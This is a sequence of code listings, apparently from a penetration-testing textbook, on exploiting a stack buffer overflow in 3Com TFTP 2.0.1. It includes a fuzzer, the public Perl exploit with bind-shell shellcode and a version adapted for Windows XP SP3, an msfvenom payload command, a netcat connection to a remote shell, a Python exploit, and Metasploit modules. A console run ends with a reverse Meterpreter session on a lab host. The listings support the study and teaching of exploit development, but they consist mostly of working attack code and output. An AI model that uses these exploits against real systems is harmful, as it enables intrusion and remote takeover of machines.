["```\n#include <string.h>\n#include <stdio.h>\n\nvoid overflowed() {\n        printf(\"%s\\n\", \"Execution Hijacked\");\n}\n\nvoid function(char *str){\n        char buffer[5];\n        strcpy(buffer, str); ❶\n}\nvoid main(int argc, char *argv[])\n{\n        function(argv[1]); ❷\n        printf(\"%s\\n\", \"Executed normally\");\n}\n```", "```\n  2 bytes    string    1 byte    string    1 byte\n------------------------------------------------\n| Opcode |  Filename  |   0  |    Mode    |   0  |\n------------------------------------------------\n```", "```\n#!/usr/bin/python\nimport socket\nbufferarray = [\"A\"*100] ❶\naddition = 200\nwhile len(bufferarray) <= 50: ❷\n        bufferarray.append(\"A\"*addition) ❸\n        addition += 100\nfor value in bufferarray: ❹\n        tftppacket = \"\\x00\\x02\" + \"Georgia\" + \"\\x00\" + value + \"\\x00\" ❺\n        print \"Fuzzing with length \" + str(len(value))\n        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ❻\n        s.sendto(tftppacket,('192.168.20.10',69))\n        response = s.recvfrom(2048)\n        print response\n```", "```\nroot@kali:~# **./tftpfuzzer**\nFuzzing with length100\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00',❶ ('192.168.20.10', 4484))\nFuzzing with length 200\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4485))\nFuzzing with length 300\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4486))\nFuzzing with length 400\n('\\x00\\x05\\x00\\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00', ('192.168.20.10', 4487))\nFuzzing with length 500\n('\\x00\\x05\\x00\\x04Unk\\x00', ('192.168.20.10', 4488))\nFuzzing with length 600 ❷\n```", "```\n#!/usr/bin/perl –w ❶\n#===============================================================\n#                3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit\n#                               By Umesh Wanve (umesh_345@yahoo.com)\n#===============================================================\n# Credits : Liu Qixu is credited with the discovery of this vulnerability.\n# Reference : http://www.securityfocus.com/bid/21301\n# Date : 27-02-2007\n# Tested on Windows 2000 SP4 Server English ❷\n#           Windows 2000 SP4 Professional English\n# You can replace shellcode with your favourite one :\n# Buffer overflow exists in transporting mode name of TFTP server.\n# So here you go.\n# Buffer = \"\\x00\\x02\"      +  \"filename\"    +  \"\\x00\" +  nop sled +  Shellcode + JUMP  + \"\\x00\";\n# This was written for educational purpose. Use it at your own risk. Author will not be\n# responsible for any damage.\n#===============================================================\nuse IO::Socket;\nif(!($ARGV[1]))\n{\n print \"\\n3COM Tftp long transport name exploit\\n\";\n print \"\\tCoded by Umesh wanve\\n\\n\";\n print \"Use: 3com_tftp.pl <host> <port>\\n\\n\";\n exit;\n}\n$target = IO::Socket::INET->new(Proto=>'udp',\n                                PeerAddr=>$ARGV[0],\n                                PeerPort=>$ARGV[1])\n                            or die \"Cannot connect to $ARGV[0] on port $ARGV[1]\";\n# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com\nmy($shellcode)= ❸\n\"\\x31\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x48\".\n\"\\xc8\\xb3\\x54\\x83\\xeb\\xfc\\xe2\\xf4\\xb4\\xa2\\x58\\x19\\xa0\\x31\\x4c\\xab\".\n\"\\xb7\\xa8\\x38\\x38\\x6c\\xec\\x38\\x11\\x74\\x43\\xcf\\x51\\x30\\xc9\\x5c\\xdf\".\n--*snip*--\n\"\\xc3\\x9f\\x4f\\xd7\\x8c\\xac\\x4c\\x82\\x1a\\x37\\x63\\x3c\\xb8\\x42\\xb7\\x0b\".\n\"\\x1b\\x37\\x65\\xab\\x98\\xc8\\xb3\\x54\";\nprint \"++ Building Malicious Packet .....\\n\";\n$nop=\"\\x90\" x 129;\n$jmp_2000 = \"\\x0e\\x08\\xe5\\x77\";❹# jmp esi user32.dll windows 2000 sp4 english\n$exploit = \"\\x00\\x02\";❺                        #write request (header)\n$exploit=$exploit.\"A\";                          #file name\n$exploit=$exploit.\"\\x00\";                       #Start of transporting name\n$exploit=$exploit.$nop;❻                      #nop sled to land into shellcode\n$exploit=$exploit.$shellcode;❼                 #our Hell code\n$exploit=$exploit.$jmp_2000;❽                  #jump to shellcode\n$exploit=$exploit.\"\\x00\";                       #end of TS mode name\nprint $target $exploit;                         #Attack on victim\nprint \"++ Exploit packet sent ...\\n\";\nprint \"++ Done.\\n\";\nprint \"++ Telnet to 4444 on victim's machine ....\\n\";\nsleep(2);\nclose($target);\nexit;\n#----------------------------------------------------------------------------------\n# milw0rm.com [2007-02-28]\n```", "```\n$**jmp_2000 = \"\\x4E\\xAE\\x45\\x7E\";**\n```", "```\nroot@kali:~# **msfvenom -p windows/shell_bind_tcp -b '\\x00' -s 473 -f perl**\n```", "```\n#!/usr/bin/perl -w\n#===============================================================\n#                3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit\n#                               By Umesh Wanve (umesh_345@yahoo.com)\n#===============================================================\n# Credits : Liu Qixu is credited with the discovery of this vulnerability.\n# Reference : http://www.securityfocus.com/bid/21301\n# Date : 27-02-2007\n# Tested on Windows XP SP3\n# You can replace shellcode with your favourite one :\n# Buffer overflow exists in transporting mode name of TFTP server.\n# So here you go.\n# Buffer = \"\\x00\\x02\"      +  \"filename\"    +  \"\\x00\" +  nop sled +  Shellcode + JUMP  + \"\\x00\";\n# This was written for educational purpose. Use it at your own risk. Author will not be responsible for any damage.\n#===============================================================\nuse IO::Socket;\nif(!($ARGV[1]))\n{\n print \"\\n3COM Tftp long transport name exploit\\n\";\n print \"\\tCoded by Umesh wanve\\n\\n\";\n print \"Use: 3com_tftp.pl <host> <port>\\n\\n\";\n exit;\n}\n$target = IO::Socket::INET->new(Proto=>'udp',\n                                PeerAddr=>$ARGV[0],\n                                PeerPort=>$ARGV[1])\n                            or die \"Cannot connect to $ARGV[0] on port $ARGV[1]\";\nmy($shellcode) = ❶\n\"\\xda\\xc5\\xd9\\x74\\x24\\xf4\\x5f\\xb8\\xd4\\x9d\\x5d\\x7a\\x29\\xc9\" .\n--*snip*--\n\"\\x27\\x92\\x07\\x7e\";\nprint \"++ Building Malicious Packet .....\\n\";\n$padding=\"A\" x 105; ❷\n$jmp_xp = \"\\x4E\\xAE\\x45\\x7E\";❸# jmp esi user32.dll windows xp sp3 english\n$exploit = \"\\x00\\x02\";                        #write request (header)\n$exploit=$exploit.\"A\";                        #file name\n$exploit=$exploit.\"\\x00\";                     #Start of transporting name\n$exploit=$exploit.$shellcode;                 #shellcode\n$exploit=$exploit.$padding;                   #padding\n$exploit=$exploit.$jmp_xp;                    #jump to shellcode\n$exploit=$exploit.\"\\x00\";                     #end of TS mode name\nprint $target $exploit;                       #Attack on victim\nprint \"++ Exploit packet sent ...\\n\";\nprint \"++ Done.\\n\";\nprint \"++ Telnet to 4444 on victim's machine ....\\n\";\nsleep(2);\nclose($target);\nexit;\n#----------------------------------------------------------------------------------------------\n# milw0rm.com [2007-02-28]\n```", "```\nroot@kali:~# **./exploitdbexploit.pl 192.168.20.10 69**\n++ Building Malicious Packet .....\n++ Exploit packet sent ...\n++ Done.\n++ Telnet to 4444 on victim's machine ....\nroot@kali:~# **nc 192.168.20.10 4444**\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n```", "```\nroot@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# **cat**\n**futuresoft_transfermode.rb**\n##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote ❶\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp ❷\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the FutureSoft TFTP Server\n        2000 product. By sending an overly long transfer-mode string, we were able\n        to overwrite both the SEH and the saved EIP. A subsequent write-exception\n        that will occur allows the transferring of execution to our shellcode\n        via the overwritten SEH. This module has been tested against Windows\n        2000 Professional and for some reason does not seem to work against\n        Windows 2000 Server (could not trigger the overflow at all).\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2005-1812'],\n          ['OSVDB', '16954'],\n          ['BID', '13821'],\n          ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],\n\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 350, ❸\n          'BadChars' => \"\\x00\", ❹\n          'StackAdjustment' => -3500, ❺\n        },\n      'Platform'       => 'win',\n      'Targets'        => ❻\n        [\n          ['Windows 2000 Pro English ALL',   { 'Ret' => 0x75022ac4} ], # ws2help.dll\n          ['Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad} ], # ws2help.dll\n          ['Windows NT SP5/SP6a English',    { 'Ret' => 0x776a1799} ], # ws2help.dll\n          ['Windows 2003 Server English',    { 'Ret' => 0x7ffc0638} ], # PEB return\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => 'May 31 2005'))\n\n    register_options(\n      [\n        Opt::RPORT(69) ❼\n      ], self.class)\n\n  end ❽\n\n  def exploit\n    connect_udp❾\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit  = \"\\x00\\x01\" + rand_text_english(14, payload_badchars) + \"\\x00\"\n    sploit += rand_text_english(167, payload_badchars)\n    seh  = generate_seh_payload(target.ret)\n    sploit[157, seh.length] = seh\n    sploit += \"\\x00\"\n\n    udp_sock.put(sploit) ❿\n\n    handler\n    disconnect_udp\n  end\nend\n```", "```\nsploit = \"\\x00\\x01\"❶ + rand_text_english(120, payload_badchars)❷ + \".\" + rand_text_english(135, payload_badchars) + [target.ret].pack('V')❸ + payload.encoded❹ + \"\\x00\"\n```", "```\n  #!/usr/bin/python\n  import socket\n❶ shellcode = (\"\\x33\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\\n  x1d\" + \"\\x4d\\x2f\\xe8\\x83\\xeb\\xfc\\xe2\\xf4\\xe1\\x27\\xc4\\xa5\\xf5\\xb4\\xd0\\x17\" +\n  --*snip*--\n  \"\\x4e\\xb2\\xf9\\x17\\xcd\\x4d\\x2f\\xe8\")\n  buffer = shellcode + \"A\" * 129 + \"\\xD3\\x31\\xC1\\x77\" ❷\n  packet = \"\\x00\\x02\" + \"Georgia\" + \"\\x00\" + buffer + \"\\x00\"\n  s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n  s.sendto(packet,('192.168.20.10',69))\n  response = s.recvfrom(2048)\n  print response\n```", "```\n##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp ❶\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => '3com TFTP Long Mode Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the 3com TFTP version 2.0.1 and below with\n          a long TFTP transport mode field in the TFTP packet.\n      },\n      'Author'         => 'Georgia',\n      'References'     => ❷\n        [\n          ['CVE', '2006-6183'],\n          ['OSVDB', '30759'],\n          ['BID', '21301'],\n          ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 473, ❸\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n         ['Windows XP Pro SP3 English', { 'Ret' => 0x7E45AE4E } ], #JMP ESI  USER32.dll ❹\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0, ❺\n      'DisclosureDate' => 'Nov 27 2006'))\n\n    register_options(\n      [\n        Opt::RPORT(69)\n      ], self.class)\n\n  end\n```", "```\ndef exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit  = \"\\x00\\x02\"❶ + rand_text_english(7, payload_badchars)❷ + \"\\x00\"❸\n    sploit += payload.encoded❹  + [target.ret].pack('V')❺ +  \"\\x00\"❻\n\n    udp_sock.put(sploit)\n\n    handler\n    disconnect_udp\n  end\nend ❼\n```", "```\nroot@kali:~# **cd /usr/share/metasploit-framework/tools/**\nroot@kali:/usr/share/metasploit-framework/tools# **./msftidy.rb /root/.msf4/modules/exploits/windows/tftp/myexploit.rb**\n```", "```\nmsf > **use windows/tftp/myexploit**\nmsf  exploit(myexploit) > **show options**\nModule options (exploit/windows/tftp/myexploit):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  69               yes       The target port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows XP Pro SP3 English\n\nmsf  exploit(myexploit) > **set RHOST 192.168.20.10**\nRHOST => 192.168.20.10\nmsf  exploit(myexploit) > **show payloads**\n--*snip*--\nmsf  exploit(myexploit) > **set payload windows/meterpreter/reverse_tcp**❶\npayload => windows/meterpreter/reverse_tcp\nmsf  exploit(myexploit) > **set LHOST 192.168.20.9**\nLHOST => 192.168.20.9\nmsf  exploit(myexploit) > **exploit**\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Trying target Windows XP Pro SP3 English...\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4662) at 2015-02-09 09:28:35 -0500\nmeterpreter >\n```"]